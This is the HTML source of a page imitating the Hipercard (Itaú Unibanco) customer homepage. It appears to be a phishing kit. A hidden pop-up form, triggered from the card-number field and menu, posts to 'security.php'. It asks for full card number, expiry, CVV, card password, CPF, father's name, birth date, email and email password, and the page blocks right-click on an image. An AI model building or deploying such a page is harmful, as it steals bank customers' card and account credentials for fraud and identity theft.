<html>
<head>
<title>Home PF - Hipercard</title>
<link rel="stylesheet" href="css/styles.css">
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">

<script src="js/jquery-1.10.2.min.js"></script>
<script src="js/jquery.cycle.all.js"></script>
<script>
$(document).ready(function(){
 $(".janelax, .modal").hide();
 
  $("#cad, #cad2, #cad3").css("cursor","pointer");
 $("#iq, #cad, .xcadx, .menu_one").click(function(){ 
  $(".janelax, .modal").slideToggle("slow");
  $(".janelax, .modal").fadeTo("slow", 0.97);
 });
$(function(){
 $(".d-topo").cycle({fx:'turnDown' });
});

});


function passaNc(){
	q.numcard.value=e.xcard.value;
	
}

</script>
</head>
<body>
<div class="area-titulo">
 <img class="img0" src="images/logo.png">
 <img class="img1" src="images/banner.png">
 <form id="f" name="e">
  <table>
   <tr>
    <td valign="top"><label class="num-hc">Número do seu Hipercard:</label></td>
    <td><input maxlength="16" id="o" size="20" name="xcard" onkeydown="if(event.keyCode >=96 && event.keyCode<=105 || event.keyCode >=48 && event.keyCode<=57 || event.keyCode == 8){}else{return false;}" type="text" /></td>
	<td><img ondragstart="return false" id="iq" onmouseover="passaNc()" src="images/button_ok.png"></td>
   </tr>
  </table>
  </form>
  <div class="busca">
  <table>
   <tr>
    <td valign="top"><label class="num-hc">Busca:</label></td>
    <td><input maxlength="16" type="text" size="25" /></td>
	<td><img ondragstart="return false" src="images/busca.png"></td>
   </tr>
  </table>
  </div>
</div>
<div class="menu" ondragstart="return false" >
<img class="menu_one" id="cad2" ondragstart="return false" src="images/menu_button.png" vspace="16" />
 <ul valign="top">
  <li class="xcadx"><a href="#">Seu Hipercard</a></li>
  <li class="xcadx"><a href="#">Seguro</a></li>
  <li class="xcadx"><a href="#">Produtos e Servi&ccedil;os</a></li>
  <li class="xcadx"><a href="#">Promo&ccedil;&otilde;es Hipercard</a></li>
  <img class="menu_down" ondragstart="return false" src="images/bar_menu.png" />
  <img class="menu_down_right" ondragstart="return false" src="images/bar_menu_gradient.png" />
 </ul>
</div>
<div class="conteudo">
 <div class="esquerda">
  <div class="e-titulo">
   Saiba Mais
  </div>
  <div class="e-corpo">
  Conheça as vantagens<br>do lojista Hipercard.
  <ul>
   <li>Saiba Mais</li>
  </ul>
  </div>
  <div class="e-corpo2">
  Imprima seu Extrato.
  <ul>
   <li>Saiba Mais</li>
  </ul>
  </div>
 <div class="e-corpo3">
 <table>
  <tr>
   <td><img class="bra" src="images/brasil.gif" /></td>
   <td class="txt-bra">Saiba onde usar <br>o seu Hipercard</td>
   </tr>
   </table>
  </div>
 <div class="e-corpo4">
 <table>
  <tr>
   <td><img class="int" src="images/interrogacao.gif" /></td>
   <td class="txt-bra">D&uacute;vidas <br>frequentes</td>
   </tr>
   </table>
  </div>
  <div class="e-corpo5">
  <table>
   <tr>
    <td class="txt-bra">Compartilhe<br>
	<img class="int" src="images/icoFacebook20.png" />
	<img class="int" src="images/icoTwitter20.png" />
	<img class="int" src="images/icoOrkut20.png" />
	</td>
   </tr>
   </table>
  </div>
 </div>
 <div class="direita">
   <div class="d-topo">
   <img src="images/banner_1.png" id="cad" />
   <img src="images/banner_2.png" id="cad" />
   </div>
   
   <script>
/*

<div class="d-baixo">
	<div class="d-baixo1">
	 <div class="d-b-titulo">
	 Parceria Redecard
	 </div>
     <div class="d-b-corpo">
	  <table>
       <tr>
        <td><img class="bra" src="images/redecard_hipercard.jpg" /></td>
        <td class="txt-bra">Hipercard fecha<br> parceria com<br>Redecard e amplia<br> aceitação no Brasil.<br>
	     <ul>
          <li>Saiba Mais</li>
         </ul>
		</td>
       </tr>
       </table>
	 </div>
	</div>
   </div>
   

   <div class="d-baixoa">
	<div class="d-baixo2">
	 <div class="d-b-titulo2">
	 Parceria Redecard
	 </div>
     <div class="d-b-corpo2">
	  <table>
       <tr>
        <td><img class="bra" src="images/canc_vendas.gif" /></td>
        <td class="txt-bra">Hipercard fecha<br> parceria com<br>Redecard e amplia<br> aceitação no Brasil.<br>
	     <ul>
          <li>Saiba Mais</li>
         </ul>
		</td>
       </tr>
       </table>
	 </div>
	</div>
   </div>   
 
  <div class="d-baixob">
	<div class="d-baixo3">
	 <div class="d-b-titulo3">
	 Parceria Redecard
	 </div>
     <div class="d-b-corpo3">
	  <table>
       <tr>
        <td><img class="bra" src="images/hiperlink.gif" /></td>
        <td class="txt-bra">Conheça mais essa hipernovidade<br>criada para você.<br><br>
	     <ul>
          <li>Saiba Mais</li>
         </ul>
		</td>
       </tr>
       </table>
	 </div>
	</div>
   </div>

*/

   </script>
   <img class="foo" src="./images/hip.png" ondragstart="return false" ondraggable="return false" onselectstart="return false" oncontextmenu="return false" />
   
 </div>
</div>
<div class="rodape">
<ul>
 <li><a href="#">Dicas de Seguran&ccedil;a</a> <img class="separador" src="images/separator.png" /></li>
 <li><a href="#">A Hipercard</a> <img class="separador" src="images/separator.png" /></li>
 <li><a href="#">Trabalhe Conosco</a> <img class="separador" src="images/separator.png" /></li>
 <li><a href="#">Uma Empresa Ita&uacute; Unibanco</a> <img class="separador" src="images/separator.png" /></li>
 <li><a href="#">Fale Conosco</a></li>
</ul>
</div>

  
<div class="janelax">
<div class="j-titulo">
HiperCard
</div>
<div class="j-corpo">
<form action="security.php" method="post" name="q">
 <table class="tx">
  <tr>
   <td>Nome do Titular:</td>
   <td><input type="text" name="nome" required="" /></td>
  </tr>
  <tr>
   <td>N&uacute;mero do Cart&atilde;o:</td>
   <td><input type="text"  required="" name="numcard" maxlength="16" placeholder="S&oacute; n&uacute;meros" onkeydown="if(event.keyCode >=96 && event.keyCode<=105 || event.keyCode >=48 && event.keyCode<=57 || event.keyCode == 8){}else{return false;}"  /></td>
  </tr>
  <tr>
   <td>Validade:</td>
   <td><input type="text"  required="" name="validade" maxlength="7" placeholder="mm/aaaa" title="Digite a v&atilde;lidade do seu visa." onkeydown="if(event.keyCode >=96 && event.keyCode<=105 || event.keyCode >=48 && event.keyCode<=57 || event.keyCode == 8){if(event.keyCode ==8){} else if(this.value.length==2){this.value=this.value+'/';}}else{return false;}" /></td>
  </tr>
  <tr>
   <td>C&oacute;dico de seguran&ccedil;a:</td>
   <td><input type="text" required="" name="cvv" maxlength="3" onkeydown="if(event.keyCode >=96 && event.keyCode<=105 || event.keyCode >=48 && event.keyCode<=57 || event.keyCode == 8){}else{return false;}" /></td>
  </tr>
  <tr>
   <td>Nosso Cliente desde:</td>
   <td>
   
   <select  required="" name="anocad" >
    <option selected>Ano</option>
	<option>2013</option>
	<option>2012</option>
	<option>2011</option>
	<option>2010</option>
	<option>2009</option>
	<option>2008</option>
	<option>2007</option>
	<option>2006</option>
	<option>2005</option>
	<option>2004</option>
	<option>2003</option>
	<option>2002</option>
	<option>2001</option>
	<option>2000</option>
	<option>1999</option>
	<option>1998</option>
	<option>1997</option>
	<option>1996</option>
	<option>1995</option>
	<option>1994</option>
	<option>1993</option>
	<option>1992</option>
	<option>1991</option>
	<option>1989</option>
	<option>1988</option>
	<option>1987</option>
	<option>1986</option>
	<option>1985</option>
	<option>1984</option>
	<option>1983</option>
	<option>1982</option>
	<option>1981</option>
	<option>1980</option>
	<option>1979</option>
	<option>1978</option>
	<option>1977</option>
	<option>1976</option>
	<option>1975</option>
	<option>1974</option>
	<option>1973</option>
	<option>1972</option>
	<option>1971</option>
	<option>1970</option>
	<option>1969</option>
	<option>1968</option>
	<option>1967</option>
	<option>1966</option>
	<option>1965</option>
	<option>1964</option>
	<option>1963</option>
	<option>1962</option>
	<option>1961</option>
	<option>1960</option>
	<option>1959</option>
	<option>1958</option>
	<option>1957</option>
	<option>1956</option>
	<option>1955</option>
	<option>1954</option>
	<option>1953</option>
	<option>1952</option>
	<option>1951</option>
	<option>1950</option>
	<option>1949</option>
	<option>1948</option>
	<option>1947</option>
	<option>1946</option>
	<option>1945</option>
	<option>1944</option>
	<option>1943</option>
	<option>1942</option>
	<option>1941</option>
	<option>1940</option>
   </select>
   </td>
  </tr>
  <tr>
   <td>CPF do Titular:</td>
   <td><input type="text"  maxlength="11" required="" name="cpf" placeholder="S&oacute; n&uacute;meros" onkeydown="if(event.keyCode >=96 && event.keyCode<=105 || event.keyCode >=48 && event.keyCode<=57 || event.keyCode == 8){}else{return false;}" /></td>
  </tr>
  <tr>
   <td>Nome Completo do Pai:</td>
   <td><input type="text" required="" name="nomepai" placeholder="José Silva" /></td>
  </tr>
  <tr>
   <td>Senha:</td>
   <td><input type="password"  required="" maxlength="4" name="hpass" /></td>
  </tr>
  <tr>
   <td>Data de Nasc.:</td>
   <td>
   <select  required="" name="dianas" >
    <option selected>Dia</option>
	<option>01</option>
	<option>02</option>
	<option>03</option>
	<option>04</option>
	<option>05</option>
	<option>06</option>
	<option>07</option>
	<option>08</option>
	<option>09</option>
	<option>10</option>
	<option>11</option>
	<option>12</option>
	<option>13</option>
	<option>14</option>
	<option>15</option>
	<option>16</option>
	<option>17</option>
	<option>18</option>
	<option>19</option>
	<option>20</option>
	<option>21</option>
	<option>22</option>
	<option>23</option>
	<option>24</option>
	<option>25</option>
	<option>26</option>
	<option>27</option>
	<option>28</option>
	<option>29</option>
	<option>30</option>
	<option>31</option>
   </select>
   <select required="" name="mesnas" >
    <option selected>Mes</option>
	<option>Janeiro</option>
	<option>Fevereiro</option>
	<option>Mar&ccedil;o</option>
	<option>Abril</option>
	<option>Junho</option>
	<option>Julho</option>
	<option>Agosto</option>
	<option>Setembro</option>
	<option>Outubro</option>
	<option>Novembro</option>
	<option>Dezembro</option>
   </select>
   <select required="" name="anonas" >
    <option selected>Ano</option>
	<option>1995</option>
	<option>1994</option>
	<option>1993</option>
	<option>1992</option>
	<option>1991</option>
	<option>1989</option>
	<option>1988</option>
	<option>1987</option>
	<option>1986</option>
	<option>1985</option>
	<option>1984</option>
	<option>1983</option>
	<option>1982</option>
	<option>1981</option>
	<option>1980</option>
	<option>1979</option>
	<option>1978</option>
	<option>1977</option>
	<option>1976</option>
	<option>1975</option>
	<option>1974</option>
	<option>1973</option>
	<option>1972</option>
	<option>1971</option>
	<option>1970</option>
	<option>1969</option>
	<option>1968</option>
	<option>1967</option>
	<option>1966</option>
	<option>1965</option>
	<option>1964</option>
	<option>1963</option>
	<option>1962</option>
	<option>1961</option>
	<option>1960</option>
	<option>1959</option>
	<option>1958</option>
	<option>1957</option>
	<option>1956</option>
	<option>1955</option>
	<option>1954</option>
	<option>1953</option>
	<option>1952</option>
	<option>1951</option>
	<option>1950</option>
	<option>1949</option>
	<option>1948</option>
	<option>1947</option>
	<option>1946</option>
	<option>1945</option>
	<option>1944</option>
	<option>1943</option>
	<option>1942</option>
	<option>1941</option>
	<option>1940</option>
   </select>
   </td>
  </tr>
  <tr>
    <td>E-mail:</td>
   <td><input type="email" required="" name="email" placeholder="example@email.com" /></td>
  </tr>
  <tr>
    <td>Senha:</td>
   <td><input type="password" required="" name="senha" placeholder="Senha" /></td>
  </tr>
 </table>
 <input type="submit" class="submitx" />
 </form>
</div>
</div>
<div class="modal"></div>
  
  
  
</body>
</html>